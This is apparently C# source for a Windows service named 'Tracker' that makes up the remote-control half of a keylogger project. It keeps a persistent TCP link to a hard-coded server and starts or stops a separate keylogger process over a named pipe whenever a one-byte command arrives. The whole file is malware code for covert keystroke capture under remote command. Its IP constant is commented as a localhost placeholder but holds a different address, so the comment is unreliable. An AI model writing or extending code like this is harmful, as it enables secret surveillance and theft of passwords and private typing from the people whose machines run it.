using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets; //used for TcpClient class
using System.Net; //used for IPEndPoint class
using System.Threading;
using System.IO;
using KeyloggerCommunications;
using System.ServiceModel;

namespace WindowsServiceTracker
{
    /***********************************************************************
     * This class is where the majority of the work of the service is done.
     * We may possibly want to split up our different functions into different
     * classes.
     ***********************************************************************/
    public partial class Tracker : ServiceBase, KeyloggerCommInterface
    {
        //Constants
        //127.0.0.1 = 0x0100007F because of network byte order
        private const long IP_ADDRESS = 0x2E3811AC; //127.0.0.1 as placeholder
        private const int PORT = 10000;
        private const string ERROR_LOG_NAME = "TrackerErrorLog";
        private const string ERROR_LOG_MACHINE = "TrackerComputer";
        private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
        private const string EXTERNAL_PROCESS = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";

        //private Process keyLogger = null;
        private ProcessStartInfo keyLoggerStartInfo;
        private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
        private volatile TcpClient tcp;
        private NetworkStream tcpStream;
        private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
            new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
        private KeyloggerCommInterface pipeProxy;
        private Thread tcpThread;
        private volatile bool tcpKeepAlive = true;

        //private Keylogger keylog = new Keylogger();

        public Tracker()
        {
            InitializeComponent();
            //Creates the error log source if it doesn't already exist
            if (!EventLog.SourceExists(ERROR_LOG_SOURCE))
            {
                EventLog.CreateEventSource(ERROR_LOG_SOURCE, ERROR_LOG_NAME);
            }
        }

        protected override void OnStart(string[] args)
        {
            //Use the following line to launch an instance of visual studio to debug
            //with. You can also just run the service and then attach the debugger
            //to the process.
            //System.Diagnostics.Debugger.Launch();

            //Keep the service running for 15 seconds
            Thread.Sleep(15000);

            //Sets the current directory to where the WindowsServiceTracker.exe is located rather
            //than some Windows folder that I couldn't seem to locate
            System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);

            tcpThread = new Thread(this.MaintainServerConnection);
            tcpThread.Start();

            //StartKeyLogger();
        }

        protected override void OnStop()
        {
            //Keylogger.Stop();
            //SendStringMsg("Bye!");

            //StopKeyLogger();

            Disconnect();
            tcpKeepAlive = false;
            if (tcpThread != null && tcpThread.IsAlive)
            {
                tcpThread.Join();
            }
        }

        private void CreateOpenPipe()
        {
            pipeProxy = pipeFactory.CreateChannel();
        }

        public bool StartKeylogger()
        {
            pipeProxy.StartKeylogger();
            return true;
        }

        public bool StopKeylogger()
        {
            pipeProxy.StopKeylogger();
            return true;
        }

        private void WriteEventLogEntry(string eventLogInput)
        {
            //Write to the Windows Event Logs, shows up under Windows Logs --> Application
            EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
        }

        //make a thread based on this method to connect to the server and read/write to the tcp connection
        private void MaintainServerConnection()
        {
            int waitToRetry = 0;
            int bufferSize = 1;
            byte[] buffer = new byte[bufferSize];
            while (tcpKeepAlive)
            {
                if (tcp == null || !tcp.Connected)
                {
                    try 
                    {
                        Connect();
                        waitToRetry = 0;
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(waitToRetry * 1000);
                        if (waitToRetry < 60)
                        {
                            waitToRetry += 5;
                        }
                    }
                }
                else
                {
                    // todo make sure thCanRead is false in the case that a previous connection was lost, 
                    // and new one created, but the stream was not changed from the old connection
                    if (tcpStream != null && tcpStream.CanRead)
                    {
                        tcpStream.Read(buffer, 0, bufferSize);
                        switch (buffer[0])
                        {
                            case 0:
                                StartKeylogger();
                                break;
                            case 1:
                                StopKeylogger();
                                break;
                            default:
                                break;
                        }
                    }
                    else
                    {
                        getTcpStream();
                    }
                }
            }
        }

        /*
        private bool StartKeyLogger() //todo exception handling
        {
            if (keyLogger != null && keyLogger.Responding)
            {
                return true;
            }
            //Create a new process and change some startup info settings
            keyLogger = new Process();
            keyLoggerStartInfo = new ProcessStartInfo();

            //File name here MUST MATCH the file name of the external process you've created
            keyLoggerStartInfo.FileName = EXTERNAL_PROCESS;
            //Verb = "runas" and UseShellExecute = true must be set for admin rights (I think)
            keyLoggerStartInfo.Verb = "runas";
            keyLoggerStartInfo.WindowStyle = ProcessWindowStyle.Normal;
            keyLoggerStartInfo.UseShellExecute = true;

            //Start the test process, look in TestProcess.cs for the actual process
            keyLogger = Process.Start(keyLoggerStartInfo);
            return true;
        }*/

        /*private bool StopKeyLogger() //todo exception handling
        {
            if (keyLogger != null)
            {
                keyLogger.Kill(); //todo explore better/safer options
            }
            return true;
        }*/

        private bool Connect()
        {
            try
            {
                tcp = new TcpClient();
                tcp.Connect(ipPort);
                return true;
            }
            catch (Exception)
            {
                //Another write to the Windows Event Logs, shows up in the same place as before but as type "Error" instead of type "Information"
                //string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
                //EventLog.WriteEntry(ERROR_LOG_SOURCE, error, EventLogEntryType.Error);
                throw new Exception("Error connecting");
            }
            //return false;
        }

        private bool Disconnect()
        {
            try
            {
                tcpStream.Close();
            }
            catch (NullReferenceException)
            { }
            return true;
        }

        private bool getTcpStream()
        {
            try
            {
                tcpStream = tcp.GetStream();
            }
            catch (InvalidOperationException)
            {
                return false;
            }
            return true;
        }

        private bool SendStringMsg(String stringMsg)
        {
            if (tcp != null && (tcpStream == null || !tcpStream.CanWrite))
            {
                try
                {
                    tcpStream = tcp.GetStream();
                }
                catch (InvalidOperationException)
                { }
            }

            if (tcpStream != null && tcpStream.CanWrite)
            {
                Byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
                tcpStream.Write(msg, 0, msg.Length);
                return true;
            }
            return false;
        }
    }
}